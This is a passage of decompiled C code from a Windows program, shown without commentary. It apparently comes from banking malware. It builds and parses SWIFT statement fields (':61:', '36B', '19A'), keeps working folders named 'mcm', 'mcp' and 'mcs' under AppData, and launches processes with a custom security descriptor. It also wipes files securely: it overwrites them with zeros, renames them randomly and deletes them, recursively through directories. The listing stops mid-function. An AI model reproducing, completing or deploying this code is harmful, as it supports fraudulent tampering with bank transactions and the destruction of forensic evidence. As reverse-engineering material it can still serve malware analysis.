CHAR a0[] = "0"; // idb
char aI64dI64d[] = "%I64d,%I64d"; // idb
char aSS_2[] = ":%s:%s\r\n"; // idb
char SubStr[] = ": "; // idb
CHAR asc_40FE04[] = " "; // idb
char aSS_1[] = "%s\r\n%s\r\n"; // idb
char a61SSSSS[] = ":61:%s%s%s%s%s"; // idb
CHAR asc_40FE24[] = " #"; // idb
char aSCS2dSSS[] = ":%s:%c%s%.2d%s%s%s\r\n"; // idb
char asc_40FE40[] = ":"; // idb
int dword_40FE44 = 1701012804; // weak
int dword_40FE48 = 1919246957; // weak
char byte_40FE4C = '\0'; // weak
int dword_40FE50 = 1702260558; // weak
int dword_40FE54 = 1919246957; // weak
char byte_40FE58 = '\0'; // weak
int dword_40FE5C = 1869898575; // weak
int dword_40FE60 = 7497058; // weak
int dword_40FE64 = 1953523027; // weak
int dword_40FE68 = 1700949349; // weak
__int16 word_40FE6C = 114; // weak
int dword_40FE70 = 1969714497; // weak
__int16 word_40FE74 = 29811; // weak
char byte_40FE76 = '\0'; // weak
int dword_40FE78 = 2037151050; // weak
char byte_40FE7C = '\0'; // weak
int dword_40FE80 = 1701737802; // weak
char byte_40FE84 = '\0'; // weak
int dword_40FE88 = 7954765; // weak
int dword_40FE8C = 1769107521; // weak
__int16 word_40FE90 = 108; // weak
int dword_40FE94 = 1668440397; // weak
__int16 word_40FE98 = 104; // weak
int dword_40FE9C = 1919051078; // weak
int dword_40FEA0 = 2037539189; // weak
char byte_40FEA4 = '\0'; // weak
char aSSSS[] = ":%s:%s%s%s\r\n"; // idb
char aSSS_0[] = ":%s:%s%s\r\n"; // idb
char a36b[] = "36B: "; // idb
char a19a[] = "19A: "; // idb
char a90b[] = "90B: "; // idb
char a61[] = "61: "; // idb
char a65[] = "65: "; // idb
char a64_0[] = "64: "; // idb
char asc_40FEFC[] = "\r\n"; // idb
char Dir[260] =
{
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  
}; // idb
char Path[260]; // idb
char byte_410110[260]; // idb
char byte_410214[260]; // idb
char byte_410318[260]; // idb
char byte_41041C[260]; // idb
char byte_410520[260]; // idb
char byte_410624[260]; // idb
char byte_410728[260]; // idb
char byte_41082C[260]; // idb
char byte_410930[260]; // idb
char byte_410A34[260]; // idb
char byte_410B38[260]; // idb
char byte_410C3C[260]; // idb
char FileName[260]; // idb
char Filename[520]; // idb
_UNKNOWN unk_41104C; // weak
char byte_411050; // weak
void *Memory; // idb
int dword_411058; // weak
_UNKNOWN unk_411060; // weak
int dword_411064; // weak
char Str1[32768]; // idb
_UNKNOWN unk_419068; // weak
_UNKNOWN unk_419088; // weak
_UNKNOWN unk_41918C; // weak
char byte_419290[260]; // idb
const CHAR szServerName; // idb
char byte_41949C[260]; // idb
int dword_4195A0; // idb
__int64 qword_4195A8; // weak
__int64 qword_4195B0; // weak
__int64 qword_4195B8; // weak
__int64 qword_4195C0; // weak
char byte_4195C8; // weak
char byte_4195C9; // weak
int dword_4195CC; // weak
struct _RTL_CRITICAL_SECTION CriticalSection; // idb
SERVICE_STATUS_HANDLE hServiceStatus; // idb
struct _SERVICE_STATUS ServiceStatus; // idb


//----- (00401000) --------------------------------------------------------
FILE *sub_401000(char *Format, ...)
{
  FILE *result; // eax
  FILE *v2; // esi
  struct _SYSTEMTIME SystemTime; // [esp+8h] [ebp-10010h]
  char DstBuf; // [esp+18h] [ebp-10000h]
  char v5; // [esp+19h] [ebp-FFFFh]
  __int16 v6; // [esp+10015h] [ebp-3h]
  char v7; // [esp+10017h] [ebp-1h]
  va_list va; // [esp+10020h] [ebp+8h]

  va_start(va, Format);
  DstBuf = 0;
  memset(&v5, 0, 0xFFFCu);
  v6 = 0;
  v7 = 0;
  vsnprintf(&DstBuf, 0xFFFFu, Format, va);
  *(_DWORD *)&SystemTime.wMonth = 0;
  *(_DWORD *)&SystemTime.wDay = 0;
  *(_DWORD *)&SystemTime.wMinute = 0;
  SystemTime.wYear = 0;
  SystemTime.wMilliseconds = 0;
  GetLocalTime(&SystemTime);
  result = fopen(Filename, Mode);
  v2 = result;
  if ( result )
  {
    fprintf(result, ::Format, SystemTime.wHour, SystemTime.wMinute, SystemTime.wSecond, &DstBuf);
    result = (FILE *)fclose(v2);
  }
  return result;
}

//----- (004010D0) --------------------------------------------------------
void sub_4010D0()
{
  CHAR Buffer; // [esp+8h] [ebp-104h]
  char v1; // [esp+9h] [ebp-103h]
  __int16 v2; // [esp+109h] [ebp-3h]
  char v3; // [esp+10Bh] [ebp-1h]

  Buffer = 0;
  memset(&v1, 0, 0x100u);
  v2 = 0;
  v3 = 0;
  GetWindowsDirectoryA(&Buffer, 0x103u);
  sprintf(Dir, aCUsersSAppdata, Buffer, aAdministrator, aAllians);
  CreateDirectoryA(Dir, 0);
  makepath(Path, 0, Dir, aMcf, 0);
  makepath(byte_410110, 0, Dir, aMcp, 0);
  makepath(byte_410214, 0, byte_410110, aIn, 0);
  makepath(byte_410318, 0, byte_410110, aOut, 0);
  makepath(byte_41041C, 0, byte_410110, aUnk, 0);
  makepath(byte_410520, 0, Dir, aMcs, 0);
  makepath(byte_410624, 0, byte_410520, aNfzp, 0);
  makepath(byte_410728, 0, byte_410520, aNfzf, 0);
  makepath(byte_41082C, 0, byte_410520, aFofp, 0);
  makepath(byte_410930, 0, byte_410520, aFoff, 0);
  makepath(byte_410A34, 0, Dir, aMcm, 0);
  makepath(byte_410C3C, 0, byte_410A34, aIn, 0);
  makepath(byte_410B38, 0, byte_410A34, aOut, 0);
  makepath(FileName, 0, Dir, aGpcaDat, 0);
  makepath(Filename, 0, Dir, aRecasDat, 0);
}

//----- (00401290) --------------------------------------------------------
void *__cdecl sub_401290(LPCSTR lpFileName, int a2)
{
  HANDLE v2; // eax
  void *v3; // ebx
  void *v5; // edi
  DWORD v6; // eax
  const CHAR *v7; // esi
  HLOCAL v8; // eax

  v2 = CreateFileA(lpFileName, 0x80000000, 0, 0, 3u, 0x80u, 0);
  v3 = v2;
  if ( v2 == (HANDLE)-1 )
    return 0;
  v5 = 0;
  v6 = GetFileSize(v2, 0);
  v7 = (const CHAR *)v6;
  if ( v6 )
  {
    if ( v6 != -1 )
    {
      v8 = LocalAlloc(0x40u, v6 + 1);
      v5 = v8;
      if ( v8 )
      {
        if ( !ReadFile(v3, v8, (DWORD)v7, (LPDWORD)&lpFileName, 0) || v7 != lpFileName )
        {
          LocalFree(v5);
          v5 = 0;
        }
      }
    }
  }
  CloseHandle(v3);
  if ( a2 )
    *(_DWORD *)a2 = v7;
  return v5;
}

//----- (00401320) --------------------------------------------------------
DWORD __cdecl sub_401320(LPCSTR lpFileName, LPCVOID lpBuffer, DWORD nNumberOfBytesToWrite, char a4)
{
  const CHAR *v4; // esi
  signed int v5; // edi
  char v6; // bl
  HANDLE v7; // eax
  void *v8; // esi
  const CHAR *v10; // ebx

  v4 = lpFileName;
  v5 = 0;
  sub_4014F0(lpFileName);
  v6 = a4;
  v7 = CreateFileA(v4, 0xC0000000, 0, 0, a4 != 0 ? 4 : 2, 0x80u, 0);
  v8 = v7;
  if ( v7 == (HANDLE)-1 )
    return GetLastError();
  if ( v6 )
    SetFilePointer(v7, 0, 0, 2u);
  v10 = (const CHAR *)nNumberOfBytesToWrite;
  if ( !WriteFile(v8, lpBuffer, nNumberOfBytesToWrite, (LPDWORD)&lpFileName, 0) || v10 != lpFileName )
    v5 = 1;
  CloseHandle(v8);
  return v5;
}

//----- (004013B0) --------------------------------------------------------
int __cdecl sub_4013B0(LPCSTR lpFileName, int a2)
{
  signed int v2; // esi
  _BYTE *v3; // ebx
  int v5; // [esp+0h] [ebp-4h]

  v2 = -1;
  v5 = 0;
  v3 = sub_401290(lpFileName, (int)&v5);
  if ( !v3 )
    return -1;
  if ( (unsigned int)v5 >= 0x8438 )
  {
    v5 = 33848;
    sub_40BBC0((int)&unk_40F020, 16, v3, 33848);
    if ( *(_DWORD *)v3 == -1599029040 )
    {
      qmemcpy((void *)a2, v3, v5);
      v2 = 0;
    }
  }
  LocalFree(v3);
  return v2;
}

//----- (00401440) --------------------------------------------------------
DWORD __cdecl sub_401440(LPCSTR lpString)
{
  int v1; // ebx
  DWORD v2; // eax
  char *v4; // eax
  CHAR *v5; // esi
  char *v6; // eax

  v1 = -1;
  if ( !lpString || !lstrlenA(lpString) )
    return -1;
  v2 = GetFileAttributesA(lpString);
  if ( v2 != -1 )
    return ((v2 & 0x10) != 0) - 1;
  v4 = strdup(lpString);
  v5 = v4;
  v6 = strrchr(v4, 92);
  if ( v6 )
  {
    *v6 = 0;
    v1 = sub_401440(v5);
    if ( v1 )
    {
      free(v5);
      return v1;
    }
    free(v5);
    if ( !CreateDirectoryA(lpString, 0) )
      return GetLastError();
    Sleep(0x64u);
  }
  return v1;
}

//----- (004014F0) --------------------------------------------------------
DWORD __cdecl sub_4014F0(LPCSTR lpString)
{
  DWORD v1; // edi
  char *v2; // eax
  CHAR *v3; // esi
  char *v4; // eax

  v1 = -1;
  if ( !lpString || !lstrlenA(lpString) )
    return -1;
  v2 = strdup(lpString);
  v3 = v2;
  v4 = strrchr(v2, 92);
  if ( v4 )
  {
    *v4 = 0;
    v1 = sub_401440(v3);
  }
  free(v3);
  return v1;
}

//----- (00401550) --------------------------------------------------------
DWORD __cdecl sub_401550(LPCSTR lpExistingFileName, char a2)
{
  const CHAR *v2; // ebx
  char *v3; // eax
  char *v4; // esi
  char v5; // al
  char Str; // [esp+Ch] [ebp-104h]
  char v8; // [esp+Dh] [ebp-103h]
  __int16 v9; // [esp+10Dh] [ebp-3h]
  char v10; // [esp+10Fh] [ebp-1h]

  Str = 0;
  v2 = lpExistingFileName;
  memset(&v8, 0, 0x100u);
  v9 = 0;
  v10 = 0;
  strcpy(&Str, lpExistingFileName);
  v3 = strrchr(&Str, 92);
  if ( v3 )
    v4 = v3 + 1;
  else
    v4 = &Str;
  if ( *v4 )
  {
    do
    {
      *v4 = rand() % 26 + 97;
      v5 = (v4++)[1];
    }
    while ( v5 );
  }
  if ( MoveFileA(lpExistingFileName, &Str) )
    v2 = &Str;
  if ( a2 )
  {
    if ( !RemoveDirectoryA(v2) )
      return GetLastError();
  }
  else if ( !DeleteFileA(v2) )
  {
    return GetLastError();
  }
  return 0;
}

//----- (00401640) --------------------------------------------------------
DWORD __cdecl sub_401640(LPCSTR lpFileName)
{
  HANDLE v1; // eax
  void *v2; // esi
  LONG v4; // eax
  DWORD v5; // ecx
  unsigned int v6; // ebp
  LONG v7; // edi
  unsigned __int8 v8; // of
  int v9; // eax
  DWORD v10; // ecx
  unsigned int v11; // kr00_4
  DWORD v12; // kr08_4
  LARGE_INTEGER FileSize; // [esp+Ch] [ebp-1014h]
  DWORD NumberOfBytesWritten; // [esp+14h] [ebp-100Ch]
  int v15; // [esp+1Ch] [ebp-1004h]
  char Buffer; // [esp+20h] [ebp-1000h]
  char v17; // [esp+21h] [ebp-FFFh]
  __int16 v18; // [esp+101Dh] [ebp-3h]
  char v19; // [esp+101Fh] [ebp-1h]

  Buffer = 0;
  memset(&v17, 0, 0xFFCu);
  v18 = 0;
  v19 = 0;
  v1 = CreateFileA(lpFileName, 0x40000000u, 0, 0, 3u, 0x80u, 0);
  v2 = v1;
  if ( v1 == (HANDLE)-1 )
    return GetLastError();
  SetFilePointer(v1, -1, 0, 2u);
  WriteFile(v2, &Buffer, 1u, &NumberOfBytesWritten, 0);
  FlushFileBuffers(v2);
  FileSize.QuadPart = 0i64;
  GetFileSizeEx(v2, &FileSize);
  SetFilePointer(v2, 0, 0, 0);
  v4 = FileSize.HighPart;
  v5 = FileSize.LowPart;
  v6 = 0;
  v7 = 0;
  if ( FileSize.HighPart >= 0 && (FileSize.HighPart > 0 || FileSize.LowPart > 0) )
  {
    while ( 1 )
    {
      v8 = __OFSUB__(__PAIR__(v4, v5), __PAIR__(v7, v6));
      v11 = v5 - v6;
      v9 = (__PAIR__(v4, v5) - __PAIR__((unsigned int)v7, v6)) >> 32;
      v10 = v5 - v6;
      if ( v9 < 0 || (unsigned __int8)((v9 < 0) ^ v8) | (v9 == 0) && v11 <= 0x1000 )
      {
        v15 = v9;
      }
      else
      {
        v10 = 4096;
        v15 = 0;
      }
      if ( !WriteFile(v2, &Buffer, v10, &NumberOfBytesWritten, 0) || !NumberOfBytesWritten )
        break;
      v4 = FileSize.HighPart;
      v12 = NumberOfBytesWritten + v6;
      v7 = (__PAIR__(v7, NumberOfBytesWritten) + (unsigned __int64)v6) >> 32;
      v6 += NumberOfBytesWritten;
      if ( v7 < FileSize.HighPart )
      {
        v5 = FileSize.LowPart;
      }
      else
      {
        if ( v7 > FileSize.HighPart )
          break;
        v5 = FileSize.LowPart;
        if ( v12 >= FileSize.LowPart )
          break;
      }
    }
  }
  FlushFileBuffers(v2);
  CloseHandle(v2);
  return sub_401550(lpFileName, 0);
}

//----- (00401780) --------------------------------------------------------
HANDLE __cdecl sub_401780(char *Dir, char *Filename)
{
  HANDLE result; // eax
  void *v3; // esi
  char Path; // [esp+10h] [ebp-244h]
  char v5; // [esp+11h] [ebp-243h]
  __int16 v6; // [esp+111h] [ebp-143h]
  char v7; // [esp+113h] [ebp-141h]
  struct _WIN32_FIND_DATAA FindFileData; // [esp+114h] [ebp-140h]

  Path = 0;
  memset(&v5, 0, 0x100u);
  v6 = 0;
  v7 = 0;
  makepath(&Path, 0, Dir, Filename, 0);
  FindFileData.dwFileAttributes = 0;
  memset(&FindFileData.ftCreationTime, 0, 0x13Cu);
  result = FindFirstFileA(&Path, &FindFileData);
  v3 = result;
  if ( result != (HANDLE)-1 )
  {
    do
    {
      if ( !(FindFileData.dwFileAttributes & 0x10) )
      {
        makepath(&Path, 0, Dir, FindFileData.cFileName, 0);
        sub_401640(&Path);
      }
    }
    while ( FindNextFileA(v3, &FindFileData) );
    FindClose(v3);
    result = 0;
  }
  return result;
}

//----- (00401860) --------------------------------------------------------
DWORD __cdecl sub_401860(LPCSTR lpExistingFileName)
{
  return sub_401550(lpExistingFileName, 1);
}

//----- (00401870) --------------------------------------------------------
DWORD __cdecl sub_401870(char *Dir)
{
  HANDLE v1; // edi
  char Path; // [esp+8h] [ebp-244h]
  char v4; // [esp+9h] [ebp-243h]
  __int16 v5; // [esp+109h] [ebp-143h]
  char v6; // [esp+10Bh] [ebp-141h]
  struct _WIN32_FIND_DATAA FindFileData; // [esp+10Ch] [ebp-140h]

  Path = 0;
  memset(&v4, 0, 0x100u);
  v5 = 0;
  v6 = 0;
  makepath(&Path, 0, Dir, Ext, Ext);
  FindFileData.dwFileAttributes = 0;
  memset(&FindFileData.ftCreationTime, 0, 0x13Cu);
  v1 = FindFirstFileA(&Path, &FindFileData);
  if ( v1 == (HANDLE)-1 )
    return GetLastError();
  do
  {
    if ( strcmp(FindFileData.cFileName, Str2) && strcmp(FindFileData.cFileName, asc_40F0DC) )
    {
      makepath(&Path, 0, Dir, FindFileData.cFileName, 0);
      if ( FindFileData.dwFileAttributes & 0x10 )
      {
        sub_401870(&Path);
        sub_401860(&Path);
      }
      else
      {
        sub_401640(&Path);
      }
    }
  }
  while ( FindNextFileA(v1, &FindFileData) );
  FindClose(v1);
  sub_401550(Dir, 1);
  return 0;
}

//----- (004019F0) --------------------------------------------------------
int __cdecl sub_4019F0(char *FullPath, char *Dir, char *a3, char a4)
{
  int result; // eax
  char *v5; // ecx
  char Path; // [esp+8h] [ebp-30Ch]
  char v7; // [esp+9h] [ebp-30Bh]
  __int16 v8; // [esp+109h] [ebp-20Bh]
  char v9; // [esp+10Bh] [ebp-209h]
  char Filename; // [esp+10Ch] [ebp-208h]
  char v11; // [esp+10Dh] [ebp-207h]
  __int16 v12; // [esp+20Dh] [ebp-107h]
  char v13; // [esp+20Fh] [ebp-105h]
  char Ext; // [esp+210h] [ebp-104h]
  char v15; // [esp+211h] [ebp-103h]
  __int16 v16; // [esp+311h] [ebp-3h]
  char v17; // [esp+313h] [ebp-1h]

  result = sub_401440(Dir);
  if ( !result )
  {
    Filename = 0;
    memset(&v11, 0, 0x100u);
    v12 = 0;
    v13 = 0;
    Ext = 0;
    memset(&v15, 0, 0x100u);
    v16 = 0;
    v17 = 0;
    Path = 0;
    memset(&v7, 0, 0x100u);
    v8 = 0;
    v9 = 0;
    splitpath(FullPath, 0, 0, &Filename, &Ext);
    v5 = a3;
    if ( !a3 )
      v5 = &Filename;
    makepath(&Path, 0, Dir, v5, (const char *)(a3 == 0 ? (unsigned int)&Ext : 0));
    if ( a4 )
    {
      if ( !MoveFileA(FullPath, &Path) )
        return GetLastError();
    }
    else if ( !CopyFileA(FullPath, &Path, 0) )
    {
      return GetLastError();
    }
    result = 0;
  }
  return result;
}

//----- (00401B10) --------------------------------------------------------
_DWORD *__cdecl sub_401B10(_DWORD *a1)
{
  HANDLE v1; // eax
  PSID *v2; // esi
  _DWORD *result; // eax
  PSECURITY_DESCRIPTOR v4; // ecx
  DWORD ReturnLength; // [esp+8h] [ebp-410h]
  HANDLE TokenHandle; // [esp+Ch] [ebp-40Ch]
  LPSTR StringSid; // [esp+10h] [ebp-408h]
  PSECURITY_DESCRIPTOR SecurityDescriptor; // [esp+14h] [ebp-404h]
  char Dest; // [esp+18h] [ebp-400h]
  char v10; // [esp+19h] [ebp-3FFh]
  __int16 v11; // [esp+415h] [ebp-3h]
  char v12; // [esp+417h] [ebp-1h]

  Dest = 0;
  TokenHandle = 0;
  memset(&v10, 0, 0x3FCu);
  v11 = 0;
  v12 = 0;
  v1 = GetCurrentProcess();
  if ( OpenProcessToken(v1, 8u, &TokenHandle) )
  {
    ReturnLength = 0;
    GetTokenInformation(TokenHandle, TokenUser, 0, 0, &ReturnLength);
    v2 = (PSID *)calloc(1u, ReturnLength);
    if ( GetTokenInformation(TokenHandle, TokenUser, v2, ReturnLength, &ReturnLength)
      && ConvertSidToStringSidA(*v2, &StringSid) )
    {
      snprintf(&Dest, 0x400u, aDAOiciGaCoAOic, StringSid);
      LocalFree(StringSid);
    }
    CloseHandle(TokenHandle);
    free(v2);
  }
  SecurityDescriptor = 0;
  if ( !ConvertStringSecurityDescriptorToSecurityDescriptorA(&Dest, 1u, &SecurityDescriptor, 0) )
    return 0;
  result = a1;
  v4 = SecurityDescriptor;
  a1[2] = 0;
  *a1 = 12;
  a1[1] = v4;
  return result;
}

//----- (00401C30) --------------------------------------------------------
DWORD __cdecl sub_401C30(LPSTR lpCommandLine)
{
  struct _SECURITY_ATTRIBUTES *v1; // eax
  int v3; // [esp+8h] [ebp-60h]
  int v4; // [esp+Ch] [ebp-5Ch]
  int v5; // [esp+10h] [ebp-58h]
  struct _PROCESS_INFORMATION ProcessInformation; // [esp+14h] [ebp-54h]
  struct _STARTUPINFOA StartupInfo; // [esp+24h] [ebp-44h]

  ProcessInformation.hThread = 0;
  ProcessInformation.dwProcessId = 0;
  StartupInfo.cb = 68;
  memset(&StartupInfo.lpReserved, 0, 0x40u);
  v4 = 0;
  ProcessInformation.hProcess = 0;
  ProcessInformation.dwThreadId = 0;
  v3 = 0;
  v5 = 0;
  v1 = (struct _SECURITY_ATTRIBUTES *)sub_401B10(&v3);
  if ( !CreateProcessA(0, lpCommandLine, v1, v1, 0, 8u, 0, 0, &StartupInfo, &ProcessInformation) )
    return GetLastError();
  WaitForSingleObject(ProcessInformation.hProcess, 0xFFFFFFFF);
  CloseHandle(ProcessInformation.hProcess);
  CloseHandle(ProcessInformation.hThread);
  return 0;
}

//----- (00401CD0) --------------------------------------------------------
int __cdecl sub_401CD0(LPCSTR lpFirst, int a2)
{
  const CHAR *v2; // esi
  int result; // eax
  int v4; // ebx
  unsigned int v5; // ebp
  int v6; // ecx
  LPSTR v7; // eax
  LPSTR v8; // ebp
  unsigned int v9; // ebp
  int v10; // eax
  LPSTR v11; // eax
  LPSTR v12; // edi
  unsigned int v13; // esi
  int v14; // ecx
  unsigned int v15; // esi
  int v16; // ecx
  LPSTR v17; // [esp+18h] [ebp+8h]

  v2 = lpFirst;
  if ( !lpFirst )
    return 0;
  if ( !*lpFirst )
    return 0;
  v4 = a2;
  v5 = strlen((const char *)&unk_41104C);
  if ( (unsigned __int8)std::basic_string<char,std::char_traits<char>,std::allocator<char>>::_Grow(a2, v5, 1) )
  {
    qmemcpy(*(void **)(a2 + 4), &unk_41104C, v5);
    v6 = *(_DWORD *)(a2 + 4);
    v2 = lpFirst;
    *(_DWORD *)(a2 + 8) = v5;
    *(_BYTE *)(v6 + v5) = 0;
  }
  v7 = StrStrIA(v2, Srch);
  v8 = v7;
  if ( v7 )
  {
    v11 = StrStrIA(v7 + 1, Srch);
    v12 = v11;
    v17 = v11;
    if ( v11 )
    {
      v15 = v11 - v8;
      if ( (unsigned __int8)std::basic_string<char,std::char_traits<char>,std::allocator<char>>::_Grow(v4, v11 - v8, 1) )
      {
        qmemcpy(*(void **)(v4 + 4), v8, v15);
        v16 = *(_DWORD *)(v4 + 4);
        v12 = v17;
        *(_DWORD *)(v4 + 8) = v15;
        *(_BYTE *)(v16 + v15) = 0;
      }
      result = *(_DWORD *)(v4 + 8) != 0 ? (unsigned int)v12 : 0;
    }
    else
    {
      v13 = strlen(v8);
      if ( (unsigned __int8)std::basic_string<char,std::char_traits<char>,std::allocator<char>>::_Grow(v4, v13, 1) )
      {
        qmemcpy(*(void **)(v4 + 4), v8, v13);
        v14 = *(_DWORD *)(v4 + 4);
        *(_DWORD *)(v4 + 8) = v13;
        *(_BYTE *)(v14 + v13) = 0;
      }
      result = (int)&v8[*(_DWORD *)(v4 + 8)];
    }
  }
  else
  {
    v9 = strlen(lpFirst);
    if ( (unsigned __int8)std::basic_string<char,std::char_traits<char>,std::allocator<char>>::_Grow(a2, v9, 1) )
    {
      qmemcpy(*(void **)(a2 + 4), lpFirst, v9);
      v10 = *(_DWORD *)(a2 + 4);
      *(_DWORD *)(a2 + 8) = v9;
      *(_BYTE *)(v10 + v9) = 0;
    }
    result = *(_DWORD *)(a2 + 8);
  }
  return result;
}
// 40D134: using guessed type int __thiscall std::basic_string<char,std::char_traits<char>,std::allocator<char>>::_Grow(_DWORD, _DWORD, _DWORD);

//----- (00401E40) --------------------------------------------------------
int __cdecl sub_401E40(LPCSTR lpFileName, int a2)
{
  signed int v2; // edi
  const CHAR *v3; // eax
  CHAR *v4; // esi
  int v6; // [esp+0h] [ebp-4h]

  v2 = -1;
  v6 = 0;
  v3 = (const CHAR *)sub_401290(lpFileName, (int)&v6);
  v4 = (CHAR *)v3;
  if ( !v3 )
    return -1;
  if ( sub_401CD0(v3, a2) )
    v2 = 0;
  LocalFree(v4);
  return v2;
}

//----- (00401E90) --------------------------------------------------------
int __cdecl sub_401E90(char *Str, int a2, int a3)
{
  return sub_401EB0(Str, a2, a3, 10, 1);
}

//----- (00401EB0) --------------------------------------------------------
int __cdecl sub_401EB0(char *Str, int a2, int a3, char a4, char a5)
{
  unsigned int v5; // ebx
  int v6; // ecx
  char *i; // esi
  char *v8; // eax
  char *v10; // eax
  unsigned int v11; // ebx
  int v12; // ecx
  unsigned int v13; // ebx
  unsigned int v14; // kr08_4
  int v15; // ecx
  char v16; // al
  unsigned int v17; // eax
  int v18; // [esp+10h] [ebp-4h]

  v5 = strlen((const char *)&unk_41104C);
  v18 = 0;
  if ( (unsigned __int8)std::basic_string<char,std::char_traits<char>,std::allocator<char>>::_Grow(a2, v5, 1) )
  {
    qmemcpy(*(void **)(a2 + 4), &unk_41104C, v5);
    v6 = *(_DWORD *)(a2 + 4);
    *(_DWORD *)(a2 + 8) = v5;
    *(_BYTE *)(v6 + v5) = 0;
  }
  for ( i = Str; i; ++v18 )
  {
    if ( v18 >= a3 )
      break;
    v8 = strchr(i, a4);
    i = v8;
    if ( v8 )
      i = v8 + 1;
  }
  if ( v18 != a3 )
    return -1;
  if ( !i )
    return -1;
  v10 = strchr(i, a4);
  if ( v10 )
  {
    v11 = (unsigned int)&v10[(a5 != 0) - (_DWORD)i];
    if ( (unsigned __int8)std::basic_string<char,std::char_traits<char>,std::allocator<char>>::_Grow(
                            a2,
                            &v10[(a5 != 0) - (_DWORD)i],
                            1) )
    {
      qmemcpy(*(void **)(a2 + 4), i, v11);
      v12 = *(_DWORD *)(a2 + 4);
      *(_DWORD *)(a2 + 8) = v11;
      *(_BYTE *)(v12 + v11) = 0;
      return (*(_DWORD *)(a2 + 8) != 0) - 1;
    }
    return (*(_DWORD *)(a2 + 8) != 0) - 1;
  }
  v14 = strlen(i) + 1;
  v13 = v14 - 1;
  if ( std::basic_string<char,std::char_traits<char>,std::allocator<char>>::max_size(a2) < v14 - 1 )
    std::_Xlen();
  v15 = *(_DWORD *)(a2 + 4);
  if ( v15 && (v16 = *(_BYTE *)(v15 - 1)) != 0 && v16 != -1 )
  {
    if ( v14 == 1 )
    {
      *(_BYTE *)(v15 - 1) = v16 - 1;
      std::basic_string<char,std::char_traits<char>,std::allocator<char>>::_Tidy(a2, 0);
      return (*(_DWORD *)(a2 + 8) != 0) - 1;
    }
  }
  else
  {
    if ( v14 == 1 )
    {
      std::basic_string<char,std::char_traits<char>,std::allocator<char>>::_Tidy(a2, 1);
      return (*(_DWORD *)(a2 + 8) != 0) - 1;
    }
    v17 = *(_DWORD *)(a2 + 12);
    if ( v17 <= 0x1F && v17 >= v13 )
      goto LABEL_28;
    std::basic_string<char,std::char_traits<char>,std::allocator<char>>::_Tidy(a2, 1);
  }
  std::basic_string<char,std::char_traits<char>,std::allocator<char>>::_Copy(a2, v13);
LABEL_28:
  qmemcpy(*(void **)(a2 + 4), i, v13);
  std::basic_string<char,std::char_traits<char>,std::allocator<char>>::_Eos(a2, v13, v13);
  return (*(_DWORD *)(a2 + 8) != 0) - 1;
}
// 40D120: using guessed type int __thiscall std::basic_string<char,std::char_traits<char>,std::allocator<char>>::max_size(_DWORD);
// 40D124: using guessed type void __cdecl std::_Xlen();
// 40D128: using guessed type int __thiscall std::basic_string<char,std::char_traits<char>,std::allocator<char>>::_Tidy(_DWORD, _DWORD);
// 40D12C: using guessed type int __thiscall std::basic_string<char,std::char_traits<char>,std::allocator<char>>::_Copy(_DWORD, _DWORD);
// 40D130: using guessed type int __fastcall std::basic_string<char,std::char_traits<char>,std::allocator<char>>::_Eos(_DWORD, _DWORD, _DWORD);
// 40D134: using guessed type int __thiscall std::basic_string<char,std::char_traits<char>,std::allocator<char>>::_Grow(_DWORD, _DWORD, _DWORD);

//----- (00402080) --------------------------------------------------------
bool __cdecl sub_402080(LPCSTR lpFirst, LPCSTR lpSrch)
{
  return StrStrIA(lpFirst, lpSrch) != 0;
}

//----- (004020A0) --------------------------------------------------------
int __cdecl sub_4020A0(LPCSTR lpFirst, int a2)
{
  int v2; // esi
  const CHAR *v3; // edi

  if ( !lpFirst )
    return -1;
  v2 = 0;
  if ( *(_DWORD *)(a2 + 4) <= 0 )
    return -1;
  v3 = (const CHAR *)(a2 + 8);
